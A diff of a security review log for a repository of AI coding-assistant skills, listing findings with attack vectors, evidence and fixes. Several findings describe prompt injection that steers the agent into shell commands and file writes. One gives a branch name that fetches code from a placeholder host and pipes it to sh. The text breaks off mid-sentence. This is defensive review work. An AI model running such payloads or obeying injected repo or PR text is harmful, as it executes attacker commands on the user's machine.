@@ -1,77 +1,20 @@
 ## Security Review — 2026-11-07 (scope: paths)
 
-**Summary:** Path-scoped scan, at HEAD 03aacf2, of the six files `codereview-marker surface
-895c3d3` lists: bin/spec-backlog-apply.sh, the codereview, pr, and spec skills, tests/lint-skills.sh,
-and tests/test-spec-backlog-apply.sh. 03aacf2 commits the /codefix pass that the prior post-fix
-re-check covered, plus a rewording of /pr merge's condition 4 that no scan had seen. The rewording
-admits the pull case and advises running /codereview after pulling, which does not help: the pulled
-commit is already upstream, so the review finds nothing to review and REVIEW_META stays as it was
-(the /pr merge WARN, re-reported). Two new NOTEs: External-Only Mode hands a range that begins with
-`-` to `git diff` ahead of the script's guard, which writes the diff to a file, and /pr status and
-inspect read other people's PR text under a pre-approved `Bash(*)`. No prior finding is resolved,
-and there are no secrets. Still pending from the prior entry: this host's live settings.json has the
-`Bash` gate matcher on CLI 2.1.311, so re-run zat.env-install.sh and restart open sessions. A
-post-fix re-check of the four files /codefix then changed found the /pr merge advice corrected (it
-now names a read that shows pulled commits) but the gate unchanged, so that WARN stays, narrowed. A
-new NOTE shows the pulled commits can empty that read. The mawk regex fix and the /spec date change
-alter no security behavior, and no finding is resolved. Totals: 0 BLOCK / 3 WARN / 24 NOTE.
+**Summary:** Path-scoped scan, at HEAD 1d1b5da, of the six files `codereview-marker surface
+03aacf2` lists: CLAUDE.md, bin/spec-backlog-apply.sh, the codereview, pr, and spec skills, and
+tests/lint-skills.sh. New since the last scan: b8746a8 puts External-Only Mode's range after
+`--end-of-options`, and 1d1b5da moves the /pr merge and review-files WARNs to Accepted Risks with
+BACKLOG entries; c09fc07 commits the fixes the last post-fix re-check covered. b8746a8 resolves the
+External-Only NOTE: a `--output=<path>` range now fails as a bad revision in E.2, E.3, and E.4, and
+lint catches a revert of each. One new NOTE: the same range still reaches the shell as pasted text,
+and git accepts `$(...)`, backticks, `;`, and `|` in branch names, so a branch name someone else
+chose can run a command in E.2 or E.3. This host's live settings.json now has the `Bash|Monitor`
+gate matcher, the operational item the last two entries carried. No secrets. Totals: 0 BLOCK / 1
+WARN / 24 NOTE.
 
 ### Findings
 
 ```
-[WARN] claude/skills/pr/SKILL.md:183-211 — /pr merge still merges a commit that reached the PR
-branch some other way once the operator has pulled it, or one pushed with `codereview-skip`. After
-/codefix, condition 4 (lines 194-204), its failure report (lines 206-210), README.md:466-472, and
-README.md:838 say that /codereview does not review pulled changes and give a read that shows them,
-which replaces the 03aacf2 advice to "run `/codereview` after pulling" (that run found nothing to
-review). Nothing in the merge flow runs the read or notices a pull, so the gate is unchanged. What
-remains of the 2026-10-02 WARN; re-checked in the post-fix working tree on 03aacf2.
-  Attack vector: a collaborator, a bot that pushes to PR branches, or a suggestion applied on
-    GitHub adds commit X to the PR branch after the last /codereview. The operator pulls, as a
-    routine sync or as the new condition 4 failure report directs, and runs /pr merge without the
-    read. Local HEAD and the PR head are both X, REVIEWED_UP_TO is an ancestor of X, and
-    REVIEW_BLOCKS is 0, so all four conditions hold, and the forked skill, which cannot tell that a
-    pull happened, merges X. A commit pushed with `codereview-skip` passes the same way. Where the
-    read is done, the pulled commits can still empty it (the first NOTE below).
-  Evidence: /codefix changed only prose. The commands at lines 184-187 and conditions 3 and 4
-    (lines 193-194) are as they were at 03aacf2, so that scan's reproduction stands: in a scratch
-    repo, after `git pull --ff-only` of a commit authored by bot@example.invalid, the skill's own
-    commands gave REVIEW_BLOCKS=0, `merge-base --is-ancestor` true, and a PR head equal to HEAD,
-    while `git diff --stat <reviewed_up_to> HEAD` showed the unreviewed line. Confidence: high on
-    the mechanism, medium on frequency (it needs someone else's commit on the PR branch).
-  Remediation: bind the review to content rather than ancestry. At Step 9, have /codereview record
-    a hash of `git diff <reviewed_up_to>` (working tree, review files excluded, computed by a
-    codereview-marker subcommand so both sides agree), and have /pr merge require `git diff
-    <reviewed_up_to> HEAD` over the same paths to hash the same. That passes the /codefix flow,
-    whose committed fixes are the reviewed working-tree change, and refuses a pulled or skipped
-    commit. Simpler: have /pr merge list `git log --format='%h %an <%ae> / %cn %s'
-    <reviewed_up_to>..HEAD` (a commit made in GitHub's web UI has the committer GitHub) whenever
-    it is not empty, and stop for the user to confirm the commits. Needs a user decision.
-
-[WARN] claude/skills/codereview/SKILL.md:203-209, 290-316, 413-436, 574-578, 686-688 — review state
-that the reviewed commits can change decides how deeply those commits are reviewed, and the changes
-never appear in the reviewed diff (same trust in claude/skills/security/SKILL.md:43-46 and
-claude/skills/pr/SKILL.md:183-193). Found in the 2026-10-02 scan. Re-checked at 03aacf2: still
-present. The cited lines are unchanged, and 03aacf2's Step 7 rule reads only the hold marks this
-run writes.
-  Attack vector: commits the operator did not author (a contributor branch merged or checked out
-    locally, a cherry-picked patch) edit CODEREVIEW.md and SECURITY.md beside the code. A
-    REVIEW_META with block 0, the right base, `"tier":"full"`, and reviewed_up_to at the code
-    commit makes the run a refresh with an empty focus set; a SECURITY.md META footer naming that
-    commit with scope full makes Step 5 skip /security; an Accepted Risks line describing the code
-    downgrades matching findings to NOTE (lines 206-207, 578). The review diff, the security
-    surface, and the push hash all exclude these files (line 238, bin/codereview-marker:68), so no
-    reviewer sees the edit, and /pr merge accepts the same REVIEW_META with no review at all.
-  Evidence: the cited lines read at 03aacf2, and EXCLUDES at bin/codereview-marker:68 still lists
-    both files. The 2026-10-02 scan reproduced the deterministic part with the skill's Step 2 and
-    Step 5 commands in a scratch repo; the model-executed downgrades were not run end to end.
-    Confidence: high on the mechanism, medium on how the model weighs planted entries.
-  Remediation: at Step 2, list `git log --format='%h %ae %s' "$(codereview-marker
-    base)"..HEAD -- CODEREVIEW.md SECURITY.md`. When a commit not authored by the operator (`git
-    config user.email`) touched them, take the full tier, run /security, read prior META and
-    Accepted Risks from `git show "$(codereview-marker base):<file>"`, and do not honor Accepted
-    Risks added in the range until the user confirms them. Needs a user decision.
-
 [WARN] claude/global-claude.md:108 — the convention loaded into every session binds every service
 to 0.0.0.0. That is safe only behind a host firewall that sees the service's traffic, which
 Docker-published ports bypass and which the documented setup path never enables (carried from the
@@ -90,66 +33,66 @@ Docker-published ports bypass and which the documented setup path never enables 
     stays, add DOCKER-USER rules that drop forwarded traffic not arriving on tailscale0, have
     hw-bootstrap.sh enable UFW, and give Windows its own binding guidance.
 
-[NOTE] claude/skills/pr/SKILL.md:185, 200-210 — the read that condition 4 now gives for pulled PR
-changes, `git log -p "${REVIEWED_UP_TO}..HEAD"` or `/codereview external "${REVIEWED_UP_TO}"`, can
-be emptied by the pulled commits themselves (same text at README.md:470-472 and 838). It is the
-interim step this entry's /pr merge WARN suggested, which /codefix applied. New in the post-fix
-re-check.
-  Attack vector: someone with push access to the PR branch, as in the /pr merge WARN, writes the
-    pulled commits. (1) A commit that adds `<file> -diff` to .gitattributes beside a change to that file
-    makes `git log -p` print "Binary files a/<file> and b/<file> differ" in place of the change,
-    and /codereview external's diff does the same (the .gitattributes NOTE). (2) REVIEWED_UP_TO is
-    read from the working tree's CODEREVIEW.md (line 185), which the pull updates. A code commit X1
-    followed by X2, which sets `reviewed_up_to` to X1, shrinks the read to X2's one-line metadata
-    hunk, and /codereview external, whose diff excludes CODEREVIEW.md, stops with "Empty diff".
-    Condition 3 holds for X1, so the gate passes as before (the review-state WARN). A suggestion
-    applied on GitHub or a dependency bot does neither, so the read works for the honest cases.
-  Evidence: this re-check, in scratch repos on git 2.34.1. (1) After a bot commit that added
-    `app.py -diff` and changed `return token == SECRET` to `return True`, `git log -p` showed the
-    .gitattributes hunk and "Binary files a/app.py and b/app.py differ"; with `--text` it showed
-    both lines. (2) With X1 and X2, the skill's line-185 grep returned X1, `merge-base
-    --is-ancestor` held, `git log -p` listed only X2's CODEREVIEW.md hunk, and the E.3 `git diff`
-    was 0 lines, while `git log -p --text` from the pre-pull head showed X1's change. `git pull`,
-    fast-forward or merge, set ORIG_HEAD to the pre-pull head. Not run through the skill or a live
-    model. Confidence: high on the mechanism, low on likelihood (it needs a hostile committer on
-    the PR branch, and a reader who does not question a new `-diff` line or a metadata-only
-    commit).
-  Remediation: take the range from the heads, not from files the pull changes. In the condition 4
-    failure report, say to `git fetch` and read `git log -p --text "HEAD..${PR_HEAD}"` before
-    pulling; in condition 4 and the README, read `git log -p --text ORIG_HEAD..HEAD` right after
-    the pull. Add `--text` to External-Only Mode's diffs, as the .gitattributes NOTE suggests. The
-    /pr merge WARN's content-hash remediation closes both.
+[NOTE] claude/skills/codereview/SKILL.md:115-126, 148, 175 — External-Only Mode still pastes the
+range into shell commands, inside double quotes in Step E.2 and bare in Steps E.3 and E.4, and git
+accepts shell syntax in branch names, so a branch name someone else chose can run a command as the
+user. What remains of the 2026-11-07 External-Only NOTE, whose option form b8746a8 closed. New in
+this scan. The pasting predates b8746a8, which narrowed it: E.2's old bare `<ref>` also split at `;`.
+  Attack vector: anyone who can name a branch the user fetches (a collaborator on the shared
+    remote, or a contributor whose fork the user adds as a remote) pushes one whose name holds
+    shell syntax. The user, or the main session on the user's behalf (/codereview is
+    model-invocable), asks for an external review of it, such as `main..origin/<name>`, and the
+    fork pastes the name as the template shows. A `$(...)` or backtick span runs inside E.2's
+    double quotes before git sees it; `x$(curl${IFS}-s${IFS}<host>/p|sh)` is a valid branch name.
+    A name holding `;` or `|` resolves, so E.2 passes it, and E.3's bare `<range>` splits there:
+    with `<from>..<name>`, the word after a `;` runs as a command with E.3's pathspecs as its
+    arguments, and a `|` pipes the diff into it. Outside auto mode the skill's `Bash(*)` grant runs
+    these unprompted. E.1 stops the mode first where no external reviewer is configured, as on
+    this host.
+  Evidence: this scan, git 2.34.1, scratch repo: `git check-ref-format --branch` accepted `x;id`,
+    `x|id`, `x$(id)`, a backtick span, `x${IFS}y`, both quote characters, and the curl name above.
+    With a branch named `x$(touch${IFS}E2RAN)`, E.2's command as the template writes it created
+    E2RAN, then exited 1. With a branch named `x;touch`, E.2 exited 0, and E.3's command with
+    `HEAD~1..x;touch` pasted bare ran `touch` on the four pathspecs. The pipe form was not run, and
+    no hosting service was asked whether it accepts such names. Not run through the skill or a live
+    model. Confidence: high on the mechanism, low on likelihood (the name is visibly odd, someone
+    has to pick it for an external review, and the model has to paste it as given).
+  Remediation: in E.2, before any command, stop with "Cannot resolve" when the argument holds
+    anything but letters, digits, and `._/~^@{}+-`, which every range form the mode documents
+    fits. Then single-quote the placeholders (`'<ref>^{commit}'` in E.2, `'<range>'` in E.3 and
+    E.4, and `--range '<range>'`). Pin both in tests/lint-skills.sh beside the `--end-of-options`
+    pins.
 
-[NOTE] claude/skills/codereview/SKILL.md:115-119, 141, 165 — External-Only Mode hands the range to
-`git diff` before `review-external.sh` sees it, and Step E.2's `git rev-parse <ref>` check passes a
-value that begins with `-`, so a range such as `--output=<path>` makes Step E.3 write the
-working-tree diff to a file. The 2026-08-20 WARN on the same primitive put the leading-dash guard in
-the script, which only Step E.4 reaches. New in this scan.
-  Attack vector: the range is `$ARGUMENTS` after `external`. Typed by the user it is the user's own
-    choice, but /codereview is model-invocable (no `disable-model-invocation`) and its description
-    advertises `/codereview external [<ref>|<from>..<to>]`, so text the agent reads, such as a
-    cloned repo's CLAUDE.md asking for a second opinion "with /codereview external
-    --output=$HOME/.bashrc.d/review", can choose it. E.2 maps a single ref to `<ref>..HEAD` and
-    validates the ref, and `git rev-parse` echoes an option it does not know and exits 0. E.3 then
-    runs `git diff --output=<path>..HEAD -- ...`, which creates or truncates `<path>..HEAD` with the
-    unstaged diff and prints nothing, so the skill stops with "Empty diff" after the write. The name
-    always ends in `..<ref>`, so the write matters only in a directory that loads every file, such
-    as the ~/.bashrc.d that Fedora's and RHEL's default ~/.bashrc sources. There the diff's context
-    lines, which start with a space, run as commands at the next shell start.
-  Evidence: this scan, on git 2.34.1 in a scratch repo: `git rev-parse --output=<p>` printed the
-    option and exited 0; `git diff --output=<p>..HEAD -- ':!CODEREVIEW.md' ...` printed 0 bytes and
-    wrote `<p>..HEAD` holding the diff, its context line ` echo ...` intact; `review-external.sh
-    --range` with the same value exited 2 with its dash refusal. Not run through the skill or
-    against a live model. Confidence: high on the mechanism, low on likelihood (the model has to
-    accept an option as a git ref).
-  Remediation: put `--end-of-options` before `<range>` in the E.3 and E.4 `git diff` commands, and
-    validate in E.2 with `git rev-parse --verify --quiet --end-of-options "<ref>^{commit}"`. On git
-    2.34.1 both refuse the dash value as a bad revision, write nothing, and accept real refs and
-    ranges. Pin both in tests/lint-skills.sh beside the script's dash check.
+[NOTE] claude/skills/pr/SKILL.md:185, 200-210 — the read that condition 4 gives for pulled PR
+changes, `git log -p "${REVIEWED_UP_TO}..HEAD"` or `/codereview external "${REVIEWED_UP_TO}"`, can
+be emptied by the pulled commits themselves (same text at README.md:470-472 and 838). Found in the
+2026-11-07 post-fix re-check at 03aacf2. Re-checked at 1d1b5da: still present; the skill is
+unchanged since c09fc07. 1d1b5da records this remediation in BACKLOG
+`pr-merge-reviewed-changes-hash`, beside the accepted /pr merge risk, which does not cover the read.
+  Attack vector: someone with push access to the PR branch writes the pulled commits. (1) A commit
+    that adds `<file> -diff` to .gitattributes beside a change to that file makes `git log -p`
+    print "Binary files a/<file> and b/<file> differ" in place of the change, and /codereview
+    external's diff does the same (the .gitattributes NOTE). (2) REVIEWED_UP_TO is read from the
+    working tree's CODEREVIEW.md (line 185), which the pull updates. A code commit X1 followed by
+    X2, which sets `reviewed_up_to` to X1, shrinks the read to X2's one-line metadata hunk, and
+    /codereview external, whose diff excludes CODEREVIEW.md, stops with "Empty diff". Condition 3
+    holds for X1, so the gate passes (the accepted review-files risk). A suggestion applied on
+    GitHub or a dependency bot does neither, so the read works for the honest cases.
+  Evidence: as recorded in the 03aacf2 post-fix re-check, in scratch repos on git 2.34.1: the
+    `-diff` commit hid the change from `git log -p` (shown with `--text`), and with X1 and X2 the
+    line-185 grep returned X1 and `git log -p` listed only X2's CODEREVIEW.md hunk. `git pull`,
+    fast-forward or merge, set ORIG_HEAD to the pre-pull head. Confidence: high on the mechanism,
+    low on likelihood (it needs a hostile committer on the PR branch, and a reader who does not
+    question a new `-diff` line or a metadata-only commit).
+  Remediation: take the range from the heads, not from files the pull changes: before pulling,
+    `git fetch` and read `git log -p --text "HEAD..${PR_HEAD}"`; right after the pull, `git log -p
+    --text ORIG_HEAD..HEAD`. Add `--text` to External-Only Mode's diffs. Deferred with the BACKLOG
+    entry above.
 
 [NOTE] claude/skills/pr/SKILL.md:11, 159-176 — /pr status and inspect pass PR bodies, comments, and
 review text, which anyone who can comment on the PR writes, into a fork whose `allowed-tools`
-pre-approves `Bash(*)`, and the skill never says that text is data. New in this scan.
+pre-approves `Bash(*)`, and the skill never says that text is data. Found in the 2026-11-07 scan at
+03aacf2. Re-checked at 1d1b5da: still present.
   Attack vector: on a public repo any GitHub user can comment on a PR. A comment written as
     instructions to the assistant reaches the model through `gh pr view --json comments --jq
     '.comments[].body'` (line 167), which status mode runs whenever comments exist, or through
@@ -157,24 +100,24 @@ pre-approves `Bash(*)`, and the skill never says that text is data. New in this 
     command runs as the user, and outside auto mode the skill's grant means no prompt. On this host
     (defaultMode auto, `autoMode.classifyAllShell` true) the classifier still sees it. The global
     allow list already passes `Bash(gh *)`, `Bash(git *)`, and `Bash(python3 *)` (accepted risk
-    below), so the skill's grant adds commands such as `curl`. Unlike the review-state and
-    planted-finding paths, this needs no write access to the repo.
-  Evidence: lines 11, 159-168, and 172-176 read at 03aacf2, and unchanged in the post-fix re-check.
-    /pr is manual-only (line 8), so the user starts the run, and the comments arrive with it. Not
-    run against a live model. Confidence: medium on the mechanism, low on likelihood.
+    below), so the skill's grant adds commands such as `curl`. Unlike the accepted review-files
+    risk and the planted-finding NOTE, this needs no write access to the repo.
+  Evidence: lines 11, 159-168, and 172-176 unchanged since 03aacf2. /pr is manual-only (line 8), so
+    the user starts the run, and the comments arrive with it. Not run against a live model.
+    Confidence: medium on the mechanism, low on likelihood.
   Remediation: say in status and inspect modes that PR bodies, comments, and reviews are other
     people's text, to be summarized as quoted data and never to decide a command, and narrow
     `allowed-tools` to `Bash(gh *)` and `Bash(git *)` so anything else falls to the session's
     rules. The /spec grant NOTE below suggests the same narrowing for /spec.
 
-[NOTE] claude/skills/codereview/SKILL.md:203-209, 566-572 — since 500153c, a finding carried into
+[NOTE] claude/skills/codereview/SKILL.md:213-219, 576-582 — since 500153c, a finding carried into
 a review goes to /codefix with its suggested fix even when its file is outside the diff, and a
 carried finding's text is repo content: CODEREVIEW.md's prior entry, or a SECURITY.md finding that
 /security carries "not re-checked" by design (claude/skills/security/SKILL.md:142-145). Found in the
-2026-11-07 scan at 895c3d3. Re-checked at 03aacf2: still present. 03aacf2's Step 7 (lines 608-613,
-656-659) skips /codefix only when every open BLOCK and WARN carries the hold mark, so a planted
-finding without the mark still starts a cycle.
-  Attack vector: a commit the operator did not author (as in the review-state WARN above) adds a
+2026-11-07 scan at 895c3d3. Re-checked at 1d1b5da: still present; Steps 1, 6, and 7 changed only in
+line numbers. Step 7 (lines 618-623, 666-669) skips /codefix only when every open BLOCK and WARN
+carries the hold mark, so a planted finding without the mark still starts a cycle.
+  Attack vector: a commit the operator did not author (as in the accepted review-files risk) adds a
     WARN to SECURITY.md's current entry about a file the push does not change, such as a CI
     workflow or a dependency manifest, with a concrete remediation that pins an action or a
     package to a commit, version, or index the attacker chose. A path-scoped /security run carries
@@ -182,39 +125,38 @@ finding without the mark still starts a cycle.
     when its suggested fix is concrete", and /codefix takes the suggested fix as its spec
     (claude/skills/codefix/SKILL.md:40-44). A planted CODEREVIEW.md finding takes the same route
     after Step 1's check that its pattern is still in the code, which the attacker can make true,
-    and lines 208-209's rule against downgrading it. The change lands outside the contributor's
+    and lines 218-219's rule against downgrading it. The change lands outside the contributor's
     visible diff, in a review that reports it as a fix. The accepted third-party-model risk covers
     the external reviewers' findings; this channel is the repo's own files.
-  Evidence: lines 566-572 and 203-209, and codefix lines 33-47, re-read at 03aacf2. What stands in
-    the way is model judgment: the /security post-fix re-check of the files /codefix changed
-    (lines 635-646) and the re-review, both of which see a pin, which reads as hardening. Not run
-    against a live model. Confidence: medium on the mechanism, low on likelihood.
+  Evidence: the cited lines re-read at 1d1b5da, and codefix lines 33-47 as read at 03aacf2
+    (unchanged since). What stands in the way is model judgment: the /security post-fix re-check of
+    the files /codefix changed (lines 645-656) and the re-review, both of which see a pin, which
+    reads as hardening. Not run against a live model. Confidence: medium on the mechanism, low on
+    likelihood.
   Remediation: in Step 6, send a carried finding to /codefix only after this run has confirmed it
     against the code, as Step 6 already requires for the built-in review's findings, and with a
     fix this run derives from the code instead of one copied from the carried text. Mark a finding
-    that /security carried as not re-checked `Requires a user decision; not for /codefix.` The
-    review-state WARN's remediation, which distrusts review files that others' commits changed,
-    closes the planted-text half. Since Step 7 runs /codefix only for findings without that mark,
-    the mark alone keeps such a finding out of the fix loop. Needs a user decision, since 500153c
-    chose the current rule.
+    that /security carried as not re-checked `Requires a user decision; not for /codefix.` Since
+    Step 7 runs /codefix only for findings without that mark, the mark alone keeps such a finding
+    out of the fix loop. BACKLOG `review-files-set-review-depth`'s fix, extended to prior findings,
+    would close the planted-text half. Needs a user decision, since 500153c chose the current rule.
 
 [NOTE] claude/skills/pr/SKILL.md:232-240 — the `--match-head-commit` guard ahead of the merge
 applies only when `gh pr merge --help` lists the flag, and this host's gh 2.4.0 (Ubuntu 22.04's
 package) does not. There, a commit that reaches the PR branch between condition 4's check (lines
 187, 194) and `gh pr merge` merges unreviewed. Found in the 2026-11-07 post-fix re-check at
-895c3d3. Re-checked at 03aacf2 and in the post-fix re-check: still present (gh still 2.4.0, and the
-lines moved only because condition 4's text grew).
+895c3d3. Re-checked at 1d1b5da: still present.
   Attack vector: a collaborator, or a bot that pushes to PR branches, pushes commit X while /pr
     merge runs. After `gh api` returns a PR head equal to local HEAD, the skill still runs the
     readiness `gh pr view` and `gh pr merge --help` before it merges, a window of seconds, and `gh
     pr merge --squash` then squashes the PR's current head, X included. hw-bootstrap.sh installs gh
     from GitHub's APT repo only when no gh is present, so a host that already had Ubuntu's 2.4.0
     keeps it, as this one has.
-  Evidence: this scan: `gh --version` prints 2.4.0+dfsg1 and `gh pr merge --help` lists no
-    `--match-head-commit`. As recorded at 895c3d3, `expectedHeadOid` appears once in the binary, as
-    a struct tag, with no flag that sets it (not traced in gh's source). No merge or API call was
-    made. Confidence: high that the guard is absent here, low on likelihood (it needs a push inside
-    that window).
+  Evidence: this scan: `gh --version` prints 2.4.0+dfsg1, and `gh pr merge --help` matches
+    `--match-head-commit` zero times. As recorded at 895c3d3, `expectedHeadOid` appears once in the
+    binary, as a struct tag, with no flag that sets it (not traced in gh's source). No merge or API
+    call was made. Confidence: high that the guard is absent here, low on likelihood (it needs a
+    push inside that window).
   Remediation: when the flag is missing, merge through the REST endpoint, which takes the expected
     head on every gh version: `gh api -X PUT "repos/{owner}/{repo}/pulls/${PR_NUMBER}/merge" -f
     merge_method=squash -f sha="$(git rev-parse HEAD)"` (GitHub refuses with 409 when the head
@@ -224,11 +166,9 @@ lines moved only because condition 4's text grew).
 [NOTE] bin/spec-backlog-apply.sh:64, 158-162 — the symlink guard checks only the last path
 component, and the script resolves BACKLOG.md against the caller's working directory, so a run from
 inside a tracked directory link still creates and fills a BACKLOG.md outside the repo. Found in the
-2026-11-07 post-fix re-check at d12ce05. Re-checked at 03aacf2: still present; the stray
-end-append refusal 03aacf2 commits (lines 102-105, 169-172) runs before any write and adds no path
-check. Re-checked in the post-fix re-check: still present; /codefix changed only four awk regexes
-(lines 234, 264, 323, 358). Since 5cd6836 the /spec turn-close capture also writes through the
-script, so this is the remaining gap in every skill-driven BACKLOG.md write.
+2026-11-07 post-fix re-check at d12ce05. Re-checked at 1d1b5da: still present; the script is
+unchanged since c09fc07. Every skill-driven BACKLOG.md write goes through it, the /spec turn-close
+capture included, so this is the remaining gap in all of them.
   Attack vector: a cloned repo tracks `app -> ../../.bashrc.d`, and text in it steers the agent to
     run the backlog step from app/ (a CLAUDE.md that names app/ as the project root, say), so the
     command is `cd app && spec-backlog-apply.sh <<'MANIFEST'` with an `append:` block. The script
@@ -240,13 +180,12 @@ script, so this is the remaining gap in every skill-driven BACKLOG.md write.
     it from the project root, directly or by pointing at /spec backlog, so the agent has to be
     steered past that, and the target directory must already exist (the script creates none). On
     this host neither directory exists, and ~/.bashrc sources no directory.
-  Evidence: this scan, at 03aacf2, in a scratch repo tracking `app -> ../outside` (mode 120000):
+  Evidence: this scan, at 1d1b5da, in a scratch repo tracking `app -> ../outside` (mode 120000):
     from inside app/, an `append:` manifest exited 0 and created outside/BACKLOG.md holding the
     entry, the repo's status stayed clean, and `git rev-parse --show-prefix` failed (exit 128)
-    inside the link. The post-fix re-check re-ran the probe against /codefix's version of the
-    script with the same result. The Fedora and RHEL behavior is from their default ~/.bashrc and
-    the rules loading from strings in the binary; neither was run. Confidence: high on the
-    mechanism, low on likelihood.
+    inside the link. The Fedora and RHEL behavior is from their default ~/.bashrc and the rules
+    loading from strings in the binary; neither was run. Confidence: high on the mechanism, low on
+    likelihood.
   Remediation: refuse unless `git rev-parse --show-prefix` succeeds and prints nothing, which holds
     only when the working directory is the repo's toplevel by its physical path (comparing `pwd -P`
     with `--show-toplevel` would likely fail on Git Bash, where git.exe spells the drive as `C:/`).
@@ -418,8 +357,8 @@ push of another ref. Deferred to BACKLOG.md (skip-marker-bound-to-diff). Last re
 
 [NOTE] claude/skills/spec/SKILL.md:8-9 — since 6f43afe made the frontmatter parse, /spec is an
 inline, model-invocable skill whose `allowed-tools` grants `Bash(*)`, Write, and Edit for the rest
-of the turn that invokes it. Found in the 2026-10-02 scan. Re-checked at 03aacf2 and in the post-fix
-re-check: lines 8-9 unchanged, and neither adds a grant.
+of the turn that invokes it. Found in the 2026-10-02 scan. Re-checked at 1d1b5da: lines 8-9
+unchanged.
   Attack vector: the post-ExitPlanMode hook tells the model to run `/spec plan`, so a turn that
     leaves plan mode can carry unprompted Bash, Write, and Edit into implementation, where content
     the model reads can steer a command.
@@ -446,16 +385,16 @@ present (carried from the 2026-11-03 scan, not re-checked).
   Remediation: `umask 077` at the top of the installer (which also closes the reviewer .env's brief
     creation window), or restore the file's previous mode after each rewrite.
 
-[NOTE] claude/skills/codereview/SKILL.md:238, 482 — the review diffs honor the repository's own
+[NOTE] claude/skills/codereview/SKILL.md:248, 492 — the review diffs honor the repository's own
 .gitattributes, so a text file marked `-diff` or `binary` reaches every diff reader as "Binary
 files a/<f> and b/<f> differ", while the marker hash still binds its content (same in the
-external-mode diffs at lines 141 and 165). Found in the 2026-10-13 scan. Re-checked at 03aacf2:
-still present; none of the four diff commands passes `--text`.
+external-mode diffs at lines 148 and 175). Found in the 2026-10-13 scan. Re-checked at 1d1b5da:
+still present; b8746a8 rewrote both external-mode diffs without adding `--text`.
   Attack vector: a commit the operator did not write adds `<file> -diff` to .gitattributes beside a
     change to that file; or, more commonly, a downstream repo marks a lockfile `-diff` to quiet
     noise, and a dependency swap in it reaches review as that one line. The external reviewers see
     only the diff, so they get nothing of the change, and a refresh review reads only diff hunks for
-    already-reviewed files (lines 344-348). A full-tier inline review and /security still read the
+    already-reviewed files (lines 354-358). A full-tier inline review and /security still read the
     whole file (it stays in `codereview-marker surface`), but nothing marks what changed.
   Evidence: as recorded on 2026-10-13 (git 2.34.1). One commit added `app.py -diff` and changed
     `return token == SECRET` to `return True`. The Step 2 diff showed the .gitattributes hunk and
@@ -466,12 +405,12 @@ still present; none of the four diff commands passes `--text`.
     hunks to the external reviewers too; report an added `-diff` or `binary` attribute on a text
     path as a finding.
 
-[NOTE] claude/skills/codereview/SKILL.md:471-475 — the secret-in-diff guard relies on a step that
+[NOTE] claude/skills/codereview/SKILL.md:481-485 — the secret-in-diff guard relies on a step that
 reports secrets, and in a full-tier review no step looks for them in plain markdown. Found in the
-2026-10-02 scan. Re-checked at 03aacf2: still present.
+2026-10-02 scan. Re-checked at 1d1b5da: still present.
   Attack vector: no adversary. A diff touches code and also adds a key to a markdown file, so it
-    takes the full tier. Step 4's full-tier dimensions (lines 376-391) include no secret check
-    (only the light tier's reduced scope does, line 286), and /security receives only
+    takes the full tier. Step 4's full-tier dimensions (lines 386-401) include no secret check
+    (only the light tier's reduced scope does, line 296), and /security receives only
     `codereview-marker surface` files, which omit plain markdown (bin/codereview-marker:131-144).
     Neither reports the key, and Step 5.5 sends the diff, key included, to OpenAI and Google. The
     symlinked BACKLOG.md WARN, resolved in 897b1a7, was one way a key file's content could reach
@@ -482,15 +421,15 @@ reports secrets, and in a full-tier review no step looks for them in plain markd
     `AIza`, `ghp_`, `github_pat_`, `AKIA`, `xox[bp]-`, `hf_`, private-key headers) and skip the
     providers on a match, or add a whole-diff secret check to Step 4.
 
-[NOTE] claude/skills/codereview/SKILL.md:416-420, 448-452 — the model extracts the commit field of
+[NOTE] claude/skills/codereview/SKILL.md:426-430, 458-462 — the model extracts the commit field of
 SECURITY.md's META footer and pastes it into a shell command, so codereview-marker's leading-dash
 check (bin/codereview-marker:152) runs only after the shell has expanded it. Found in the
-2026-10-02 scan. Re-checked at 03aacf2: still present.
+2026-10-02 scan. Re-checked at 1d1b5da: still present.
   Attack vector: a commit that edits SECURITY.md puts a `$(...)` or backtick span in the footer's
     commit value. If the model substitutes it unquoted or in double quotes into `codereview-marker
     surface <meta-commit>`, the substitution runs under the skill's `Bash(*)` grant. Step 2 already
     avoids this for reviewed_up_to with a hex-only `grep -oP` inside the command substitution
-    (lines 298, 323).
+    (lines 308, 333).
   Evidence: traced through the skill text; not tested against a live model, which may refuse such a
     value. Confidence: medium on the mechanism, low on likelihood.
   Remediation: extract the commit inside the command with a hex-only `grep -oP` (7 to 40 hex
@@ -563,8 +502,7 @@ to BACKLOG.md (push-gate-net-diff-secret) (carried from the 2026-10-02 scan, not
 
 [NOTE] claude/skills/pr/SKILL.md:152 — the PR template puts free text derived from commit messages
 inside double-quoted shell arguments, where backticks or `$(...)` run as commands under the skill's
-`Bash(*)` grant. Found in the 2026-10-02 scan. Re-checked at 03aacf2 and in the post-fix re-check:
-line 152 unchanged.
+`Bash(*)` grant. Found in the 2026-10-02 scan. Re-checked at 1d1b5da: line 152 unchanged.
   Attack vector: `gh pr create --title "<title>" --body "<body>"` with a commit subject or body
     carrying a code span or `$(...)`; even "adds `codereview-marker write`" would run that command
     and write the push marker.
@@ -582,92 +520,65 @@ from the 2026-10-01 scan, not re-checked).
     ${TEST_DIR}.
 ```
 
-No prior finding is resolved: 03aacf2 changes none of the mechanisms the in-scope findings cite.
-The post-fix re-check resolves none either: /codefix's /pr merge change corrects the advice the WARN
-called wrong but leaves the gate as it was.
+Resolved: the External-Only NOTE from the scan at 03aacf2 (claude/skills/codereview/SKILL.md, a
+range beginning with `-` made Step E.3 write the working-tree diff to a file). b8746a8's
+`--end-of-options` in E.2, E.3, and E.4 makes git read such a value as a bad revision. Moved to
+Accepted Risks by the operator in 1d1b5da, and not re-flagged: the /pr merge WARN and the
+review-files WARN.
 
 ### Coverage
 
-All eight dimensions were reviewed for the six files at HEAD 03aacf2; the working tree matched HEAD
-throughout.
+All eight dimensions were reviewed for the six files at HEAD 1d1b5da; the working tree matched
+HEAD throughout.
 
-- Read in full: bin/spec-backlog-apply.sh (372 lines) and the codereview (764), pr (252), and spec
-  (726) skills. tests/test-spec-backlog-apply.sh through its setup, teardown, symlink cases, the
-  case 03aacf2 adds, and a grep of every file-system operation; every case runs inside its
-  `mktemp -d` directory, which an EXIT trap removes. tests/lint-skills.sh through its helpers, the
-  two pins 03aacf2 changes, the shellcheck and frontmatter sections, and a grep for `eval`,
-  `source`, `rm`, `curl`, `mktemp`, `chmod`, `python3`, and writes; it is a static checker that
